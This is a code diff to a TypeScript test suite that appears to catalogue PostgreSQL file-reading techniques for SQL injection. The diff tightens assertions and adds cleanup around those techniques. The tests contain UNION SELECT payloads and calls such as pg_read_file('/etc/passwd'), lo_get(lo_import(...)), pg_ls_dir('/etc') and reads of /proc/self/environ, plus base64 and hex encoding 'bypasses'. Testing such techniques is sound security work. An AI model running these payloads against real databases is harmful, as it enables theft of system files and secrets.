@@ -8,6 +8,9 @@
  * the technique works when permitted, and handle permission errors gracefully.
  */
 
+import fs from "node:fs";
+import os from "node:os";
+import path from "node:path";
 import { describe, test, expect, beforeAll, afterAll } from "vitest";
 import {
   initDirectRunner,
@@ -16,6 +19,17 @@ import {
   directSQLExpectSuccess,
 } from "../../src/runner/direct.js";
 import { logger } from "../../src/utils/logger.js";
+
+/**
+ * Helper to unlink a large object and verify cleanup succeeded.
+ * Logs a warning if cleanup fails.
+ */
+async function cleanupLargeObject(oid: number): Promise<void> {
+  const { success, error } = await directSQL(`SELECT lo_unlink(${oid})`);
+  if (!success) {
+    console.warn(`Failed to cleanup large object ${oid}: ${error?.message}`);
+  }
+}
 
 describe("PostgreSQL Reading Files", () => {
   beforeAll(async () => {
@@ -53,15 +67,17 @@ describe("PostgreSQL Reading Files", () => {
       if (!success) {
         expect(error?.message).toMatch(/permission denied|must be superuser/i);
       }
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
 
     test("pg_read_file() with missing_ok parameter", async () => {
-      const { success: _success } = await directSQL(
+      const { success, error } = await directSQL(
         "SELECT pg_read_file('/nonexistent/file', missing_ok => true) as content"
       );
-      // Should succeed (returning NULL) or fail with permission
-      expect(true).toBe(true);
+      // Should succeed (returning NULL), fail with permission, or function variant not exist
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser|does not exist/i);
+      }
     });
   });
 
@@ -77,15 +93,17 @@ describe("PostgreSQL Reading Files", () => {
       if (!success) {
         expect(error?.message).toMatch(/permission denied|must be superuser/i);
       }
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
 
     test("Encode binary file as hex", async () => {
-      const { success: _success } = await directSQL(
+      const { success, error } = await directSQL(
         "SELECT encode(pg_read_binary_file('/etc/passwd'), 'hex') as hex_content"
       );
       // Will fail without permissions
-      expect(true).toBe(true);
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
+      }
     });
   });
 
@@ -127,7 +145,7 @@ describe("PostgreSQL Reading Files", () => {
       if (!success) {
         expect(error?.message).toMatch(/permission denied|could not open/i);
       }
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
   });
 
@@ -148,11 +166,13 @@ describe("PostgreSQL Reading Files", () => {
     });
 
     test("pg_ls_dir() on data directory", async () => {
-      const { success: _success } = await directSQL(
+      const { success, error } = await directSQL(
         "SELECT pg_ls_dir(current_setting('data_directory')) as filename LIMIT 5"
       );
       // Should work or fail with clear error
-      expect(true).toBe(true);
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
+      }
     });
   });
 
@@ -190,20 +210,27 @@ describe("PostgreSQL Reading Files", () => {
    */
   describe("Injection context examples", () => {
     test("UNION SELECT pg_read_file()", async () => {
-      const { success: _success } = await directSQL(`
+      const { success, error } = await directSQL(`
         SELECT id, username FROM users WHERE id = 1
         UNION SELECT 999, pg_read_file('/etc/passwd')
       `);
-      // Will succeed or fail based on permissions
-      expect(true).toBe(true);
+      // Demonstrates injection syntax - success depends on permissions
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
+      }
     });
 
     test("UNION SELECT pg_ls_dir() aggregated", async () => {
-      const { success: _success } = await directSQL(`
+      const { success, error } = await directSQL(`
         SELECT id, username FROM users WHERE id = 1
         UNION SELECT 999, string_agg(pg_ls_dir('/etc'), E'\\n')
       `);
-      expect(true).toBe(true);
+      // Demonstrates injection syntax - success depends on permissions
+      if (!success && error) {
+        expect(error.message).toMatch(
+          /permission denied|must be superuser|cannot contain set-returning/i
+        );
+      }
     });
 
     test("UNION SELECT config file path", async () => {
@@ -222,17 +249,23 @@ describe("PostgreSQL Reading Files", () => {
    */
   describe("Bypassing restrictions", () => {
     test("Encode file content as base64", async () => {
-      const { success: _success } = await directSQL(
+      const { success, error } = await directSQL(
         "SELECT encode(pg_read_file('/etc/passwd')::bytea, 'base64') as encoded"
       );
-      expect(true).toBe(true);
+      // Demonstrates encoding bypass - success depends on permissions
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
+      }
     });
 
     test("Encode file content as hex", async () => {
-      const { success: _success } = await directSQL(
+      const { success, error } = await directSQL(
         "SELECT encode(pg_read_file('/etc/passwd')::bytea, 'hex') as encoded"
       );
-      expect(true).toBe(true);
+      // Demonstrates encoding bypass - success depends on permissions
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
+      }
     });
   });
 
@@ -262,20 +295,23 @@ describe("PostgreSQL Reading Files", () => {
       );
       const oid = (createRows[0] as { oid: number }).oid;
 
-      // lo_get() returns bytea directly
-      const { rows: readRows } = await directSQLExpectSuccess(`SELECT lo_get(${oid}) as content`);
-      expect((readRows[0] as { content: Buffer }).content).toBeTruthy();
-
-      // Clean up
-      await directSQL(`SELECT lo_unlink(${oid})`);
+      try {
+        // lo_get() returns bytea directly
+        const { rows: readRows } = await directSQLExpectSuccess(`SELECT lo_get(${oid}) as content`);
+        expect((readRows[0] as { content: Buffer }).content).toBeTruthy();
+      } finally {
+        await cleanupLargeObject(oid);
+      }
     });
 
     test("lo_import + lo_get combined pattern", async () => {
       // This pattern is preferred for SQL injection as it works in single query
-      const { success } = await directSQL("SELECT lo_get(lo_import('/etc/passwd'))");
-      // Either works (returns bytea) or permission denied - both are valid
-      // We just verify the syntax works
-      expect(typeof success).toBe("boolean");
+      const { success, error } = await directSQL("SELECT lo_get(lo_import('/etc/passwd'))");
+      // Valid outcomes: success (returns bytea), permission denied, or LO doesn't exist
+      if (!success) {
+        expect(error?.message).toMatch(/permission denied|could not open|does not exist/i);
+      }
+      // If success, the combined pattern worked - no additional assertion needed
     });
 
     test("convert_from(lo_get(oid), 'UTF8') for text content", async () => {
@@ -285,33 +321,43 @@ describe("PostgreSQL Reading Files", () => {
       );
       const oid = (createRows[0] as { oid: number }).oid;
 
-      const { rows: readRows } = await directSQLExpectSuccess(
-        `SELECT convert_from(lo_get(${oid}), 'UTF8') as content`
-      );
-      expect((readRows[0] as { content: string }).content).toBe("readable text");
-
-      // Clean up
-      await directSQL(`SELECT lo_unlink(${oid})`);
+      try {
+        const { rows: readRows } = await directSQLExpectSuccess(
+          `SELECT convert_from(lo_get(${oid}), 'UTF8') as content`
+        );
+        expect((readRows[0] as { content: string }).content).toBe("readable text");
+      } finally {
+        await cleanupLargeObject(oid);
+      }
     });
 
     test("lo_export to retrieve via pg_read_file", async () => {
+      // Generate unique temp filename to avoid conflicts in parallel runs
+      const tempFile = path.join(os.tmpdir(), `lo_export_test_${process.pid}_${Date.now()}.txt`);
+
       // Create LO
       const { rows: createRows } = await directSQLExpectSuccess(
         "SELECT lo_from_bytea(0, 'export test data'::bytea) as oid"
       );
       const oid = (createRows[0] as { oid: number }).oid;
 
-      // Try to export (requires privileges)
-      const { success, error } = await directSQL(
-        `SELECT lo_export(${oid}, '/tmp/lo_read_test.txt')`
-      );
+      try {
+        // Try to export (requires privileges)
+        const { success, error } = await directSQL(`SELECT lo_export(${oid}, '${tempFile}')`);
 
-      if (!success) {
-        expect(error?.message).toMatch(/permission denied|could not open/i);
+        if (!success) {
+          expect(error?.message).toMatch(/permission denied|could not open/i);
+        }
+      } finally {
+        // Clean up LO
+        await cleanupLargeObject(oid);
+        // Clean up exported file if it exists
+        try {
+          fs.unlinkSync(tempFile);
+        } catch {
+          // File may not exist if export failed - ignore
+        }
       }
-
-      // Clean up
-      await directSQL(`SELECT lo_unlink(${oid})`);
     });
   });
 
@@ -329,15 +375,20 @@ describe("PostgreSQL Reading Files", () => {
         // Either permission denied or not a Linux system
         expect(error?.message).toMatch(/permission denied|must be superuser|No such file/i);
       }
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
 
     test("/proc/self/environ for environment variables", async () => {
       // Environment variables can contain secrets
-      // Note: /proc/self/environ contains null bytes, causing encoding errors
-      const { success } = await directSQL("SELECT pg_read_file('/proc/self/environ')");
-      // Either works, permission denied, or encoding error (null bytes) - all valid
-      expect(typeof success).toBe("boolean");
+      // Note: /proc/self/environ contains null bytes, which may cause encoding errors
+      const { success, error } = await directSQL("SELECT pg_read_file('/proc/self/environ')");
+      // Valid outcomes: success, permission denied, encoding error (null bytes), or file not found
+      // All are acceptable - we're testing the technique exists
+      if (!success && error) {
+        expect(error.message).toMatch(
+          /permission denied|must be superuser|No such file|invalid byte sequence/i
+        );
+      }
     });
 
     test("/proc/version for kernel info", async () => {
@@ -345,7 +396,7 @@ describe("PostgreSQL Reading Files", () => {
       if (!success) {
         expect(error?.message).toMatch(/permission denied|must be superuser|No such file/i);
       }
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
   });
 
@@ -355,38 +406,43 @@ describe("PostgreSQL Reading Files", () => {
    */
   describe("File discovery", () => {
     test("pg_ls_dir with string_agg for listing", async () => {
-      const { success, result } = await directSQL(
+      const { success, result, error } = await directSQL(
         "SELECT string_agg(pg_ls_dir('/tmp'), E'\\n') as files"
       );
       if (success && result) {
         // May be null if /tmp is empty
         expect(result.rows.length).toBe(1);
+      } else if (error) {
+        // Accepts: permission denied, superuser required, or SQL error for aggregate + SRF
+        expect(error.message).toMatch(
+          /permission denied|must be superuser|cannot contain set-returning/i
+        );
       }
-      // Either works or permission denied - both are valid
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
 
     test("pg_stat_file for file metadata", async () => {
       // pg_stat_file returns size, access, modification, change, creation times
-      const { success, result } = await directSQL(
+      const { success, result, error } = await directSQL(
         "SELECT (pg_stat_file('/etc/passwd')).size as file_size"
       );
       if (success && result) {
         // Size is returned as string by driver, convert to check
         const size = Number((result.rows[0] as { file_size: string | number }).file_size);
         expect(size).toBeGreaterThan(0);
+      } else if (error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
       }
-      // Either works or permission denied
-      expect(true).toBe(true);
+      // Both success and permission denied are acceptable outcomes
     });
 
     test("pg_stat_file for checking file existence", async () => {
       // Can be used to test if files exist
-      const { success: _success } = await directSQL(
-        "SELECT (pg_stat_file('/etc/passwd', true)).size"
-      );
-      // Either works or permission denied
-      expect(true).toBe(true);
+      const { success, error } = await directSQL("SELECT (pg_stat_file('/etc/passwd', true)).size");
+      if (!success && error) {
+        expect(error.message).toMatch(/permission denied|must be superuser/i);
+      }
+      // Both success and permission denied are acceptable outcomes
     });
   });
 
@@ -402,15 +458,16 @@ describe("PostgreSQL Reading Files", () => {
       );
       const oid = (createRows[0] as { oid: number }).oid;
 
-      // Use in UNION context
-      const { rows } = await directSQLExpectSuccess(
-        `SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, convert_from(lo_get(${oid}), 'UTF8')`
-      );
-      const values = rows.map((r) => (r as { username: string }).username);
-      expect(values).toContain("injected_content");
-
-      // Clean up
-      await directSQL(`SELECT lo_unlink(${oid})`);
+      try {
+        // Use in UNION context
+        const { rows } = await directSQLExpectSuccess(
+          `SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, convert_from(lo_get(${oid}), 'UTF8')`
+        );
+        const values = rows.map((r) => (r as { username: string }).username);
+        expect(values).toContain("injected_content");
+      } finally {
+        await cleanupLargeObject(oid);
+      }
     });
 
     test("Reading PostgreSQL data directory paths", async () => {
